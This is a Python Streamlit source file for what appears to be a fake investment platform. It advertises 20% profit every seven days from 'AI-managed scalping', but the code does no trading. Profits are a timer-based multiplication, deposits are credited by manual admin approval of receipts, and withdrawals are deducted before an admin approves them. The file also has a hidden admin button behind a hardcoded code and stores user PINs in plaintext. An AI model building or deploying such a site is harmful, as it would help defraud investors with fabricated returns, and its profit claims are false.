import streamlit as st
import json
import os
import time
from datetime import datetime, timedelta

# ==========================================
# BLOCK 1: CORE DATA ENGINE
# ==========================================
def load_registry():
    if os.path.exists("bpsm_registry.json"):
        try:
            with open("bpsm_registry.json", "r") as f: return json.load(f)
        except: return {}
    return {}

def update_user(name, data):
    reg = load_registry()
    reg[name] = data
    with open("bpsm_registry.json", "w") as f: 
        json.dump(reg, f, indent=4, default=str)

# State initialization
if 'page' not in st.session_state: st.session_state.page = "ad"
if 'user' not in st.session_state: st.session_state.user = None
if 'is_boss' not in st.session_state: st.session_state.is_boss = False
if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False
if 'sub_page' not in st.session_state: st.session_state.sub_page = "select"
if 'action_type' not in st.session_state: st.session_state.action_type = None

# ==========================================
# BLOCK 2: UI STYLES
# ==========================================
st.set_page_config(page_title="ISMEX Official", layout="wide")
st.markdown("""
    <style>
    .stApp { background-color: #0e1117; color: white; }
    .ad-panel { background: #1c1e26; border-radius: 8px; border: 1px dashed #00eeff; padding: 20px; text-align: center; }
    .stButton>button:contains("⛔") {
        background-color: transparent !important; border: none !important; color: #8c8f99 !important;
        font-size: 15px !important; padding: 0 !important; margin-left: -5px !important; display: inline !important;
    }
    </style>
    """, unsafe_allow_html=True)

# ==========================================
# BLOCK 3: PAGE ROUTING (ONE PAGE AT A TIME)
# ==========================================

# --- ROUTE A: ADMIN PANEL ---
if st.session_state.is_boss:
    st.title("👑 ADMIN CONTROL CENTER")
    if st.button("EXIT ADMIN"):
        st.session_state.is_boss = False
        st.rerun()
    
    reg = load_registry()
    
    # 1. APPROVAL QUEUE
    st.subheader("🔔 PENDING APPROVALS")
    found_pending = False
    for username, u_data in reg.items():
        pending_list = u_data.get('pending_actions', [])
        for idx, action in enumerate(pending_list):
            found_pending = True
            with st.expander(f"{action['type']} - {username} (₱{action.get('amount', 0):,.2f})"):
                st.write(f"**Date:** {action['date']}")
                if action['type'] == "DEPOSIT":
                    st.info("Receipt uploaded. Verify your Gcash/Bank before approving.")
                elif action['type'] == "WITHDRAW":
                    st.write(f"**Bank:** {action['bank']} | **Account:** {action['acc_name']}")
                    st.write(f"**Number:** {action['acc_num']}")
                
                ca, cr = st.columns(2)
                if ca.button("✅ APPROVE", key=f"app_{username}_{idx}"):
                    if action['type'] == "DEPOSIT":
                        u_data.setdefault('inv', []).append({"amount": action['amount'], "start_time": datetime.now().isoformat()})
                    u_data['pending_actions'].pop(idx)
                    update_user(username, u_data)
                    st.rerun()
                if cr.button("❌ REJECT", key=f"rej_{username}_{idx}"):
                    if action['type'] == "WITHDRAW": u_data['wallet'] += action['amount']
                    u_data['pending_actions'].pop(idx)
                    update_user(username, u_data)
                    st.rerun()

    if not found_pending: st.info("No pending requests.")
    st.divider()
    
    # 2. MANUAL ADD (Your original admin tool)
    st.subheader("🛠️ MANUAL USER MANAGEMENT")
    target = st.selectbox("Select User", list(reg.keys()))
    amt = st.number_input("Capital Amount", min_value=100.0)
    if st.button("ACTIVATE CYCLE"):
        reg[target].setdefault('inv', []).append({"amount": amt, "start_time": datetime.now().isoformat()})
        update_user(target, reg[target])
        st.success("Cycle Started!")
    st.write("Database Raw View:", reg)

# --- ROUTE B: USER DASHBOARD ---
elif st.session_state.user:
    reg = load_registry()
    data = reg.get(st.session_state.user, {})
    
    # Maturity logic
    current_invs = data.get('inv', [])
    updated_invs = []
    payout = False
    for i in current_invs:
        if datetime.now() >= (datetime.fromisoformat(i['start_time']) + timedelta(days=7)):
            data['wallet'] += (i['amount'] * 1.20)
            payout = True
        else: updated_invs.append(i)
    if payout:
        data['inv'] = updated_invs
        update_user(st.session_state.user, data)
        st.balloons()

    # Dashboard UI
    col1, col2 = st.columns([0.8, 0.2])
    with col1: st.markdown(f"### BPSM\nWelcome, {data.get('full_name')}")
    with col2:
        if st.button("LOGOUT"):
            st.session_state.user = None
            st.session_state.page = "ad"
            st.rerun()

    st.markdown(f"""
        <div style="background:#1c1e26; padding:20px; border-radius:10px; text-align:center; border:1px solid #00ff88;">
            <p style="color:#8c8f99; font-size:14px;">WITHDRAWABLE BALANCE</p>
            <h1 style="color:#00ff88; font-size:50px; margin:0;">₱{data.get('wallet', 0):,.2f}</h1>
        </div>
    """, unsafe_allow_html=True)

    # Actions
    c1, c2, c3 = st.columns(3)
    if c1.button("📥 DEPOSIT"): st.session_state.action_type = "DEP"
    if c2.button("💸 WITHDRAW"): st.session_state.action_type = "WITH"
    if c3.button("♻️ REINVEST"): st.session_state.action_type = "REIN"

    if st.session_state.action_type == "DEP":
        with st.form("d"):
            amt_d = st.number_input("Deposit Amount", min_value=100.0)
            st.file_uploader("Upload Receipt", type=['jpg','png','jpeg'])
            if st.form_submit_button("Submit"):
                data.setdefault('pending_actions', []).append({"type": "DEPOSIT", "amount": amt_d, "date": str(datetime.now())})
                update_user(st.session_state.user, data); st.success("Sent!"); st.session_state.action_type = None; st.rerun()
    
    if st.session_state.action_type == "WITH":
        with st.form("w"):
            amt_w = st.number_input("Amount", min_value=100.0, max_value=data['wallet'])
            bn, an, anum = st.text_input("Bank"), st.text_input("Account Name"), st.text_input("Account Number")
            if st.form_submit_button("Request"):
                data['wallet'] -= amt_w
                data.setdefault('pending_actions', []).append({"type": "WITHDRAW", "amount": amt_w, "bank": bn, "acc_name": an, "acc_num": anum, "date": str(datetime.now())})
                update_user(st.session_state.user, data); st.success("Requested!"); st.session_state.action_type = None; st.rerun()

    if st.session_state.action_type == "REIN":
        with st.form("r"):
            amt_r = st.number_input("Amount", min_value=100.0, max_value=data['wallet'])
            if st.form_submit_button("Reinvest Now"):
                data['wallet'] -= amt_r
                data.setdefault('inv', []).append({"amount": amt_r, "start_time": datetime.now().isoformat()})
                update_user(st.session_state.user, data); st.success("Started!"); st.session_state.action_type = None; st.rerun()

    # Active Cycles
    st.markdown("<br>### ⌛ ACTIVE CYCLES", unsafe_allow_html=True)
    if not data.get('inv'): st.info("No active cycles.")
    for inv in data.get('inv', []):
        start = datetime.fromisoformat(inv['start_time'])
        roi = (inv['amount'] * 0.20) * min((datetime.now() - start).total_seconds() / (7*24*3600), 1.0)
        rem = (start + timedelta(days=7)) - datetime.now()
        st.info(f"Capital: ₱{inv['amount']:,} | ROI: ₱{roi:,.4f} | Time: {rem.days}D {rem.seconds//3600}H")
    
    time.sleep(1); st.rerun()

# --- ROUTE C: LOGIN PAGE ---
elif st.session_state.page == "login":
    st.markdown("<h1 style='text-align:center; color:#00eeff;'>ACCESS PORTAL</h1>", unsafe_allow_html=True)
    c1, c2 = st.columns(2)
    if c1.button("LOG IN", use_container_width=True): st.session_state.sub_page = "login_form"
    if c2.button("REGISTER", use_container_width=True): st.session_state.sub_page = "reg_form"
    
    if st.session_state.sub_page == "login_form":
        u = st.text_input("USERNAME").upper().strip()
        p = st.text_input("PIN", type="password")
        if st.button("ENTER"):
            reg = load_registry()
            db_k = u.replace(" ", "_")
            ud = reg.get(db_k) or reg.get(u)
            if ud and str(ud['pin']) == str(p):
                st.session_state.user = db_k if db_k in reg else u
                st.rerun()
            else: st.error("Invalid")
    elif st.session_state.sub_page == "reg_form":
        f, l = st.text_input("FIRST").upper(), st.text_input("LAST").upper()
        p = st.text_input("PIN", type="password", max_chars=6)
        if st.button("SUBMIT") and f and l and len(p)==6:
            update_user(f"{f}_{l}", {"pin": p, "wallet": 0.0, "inv": [], "full_name": f"{f} {l}", "pending_actions": []})
            st.success("Done!"); st.session_state.sub_page = "login_form"; st.rerun()

# --- ROUTE D: AD FRONT PAGE ---
else:
    st.markdown('<h1 style="text-align:center; font-size:45px; font-weight:900; background:linear-gradient(90deg, #ff007f, #ffaa00, #00ff88, #00eeff); -webkit-background-clip: text; color: transparent; margin-bottom:20px;">INTERNATIONAL STOCK MARKET EXCHANGE</h1>', unsafe_allow_html=True)
    cl, cb1, cb2, cr = st.columns([0.35, 0.1, 0.2, 0.35])
    with cb1:
        if st.button("⛔"): st.session_state.admin_mode = not st.session_state.admin_mode
    with cb2:
        if st.button("🚀 JOIN NOW!"): st.session_state.page = "login"; st.rerun()

    st.markdown("""<div class="ad-panel"><p style="color:#00eeff; font-weight:bold;">How We Generate Your Profit:</p>
    <p style="color:#8c8f99;">Your capital is diversified and cycled via AI-managed scalping. Small 0.05% profits from thousands of trades combine 
    for your 20% profit over 7 days.</p></div>""", unsafe_allow_html=True)

    if st.session_state.admin_mode:
        if st.text_input("Code", type="password") == "0102030405":
            st.session_state.is_boss = True; st.session_state.admin_mode = False; st.rerun()
                
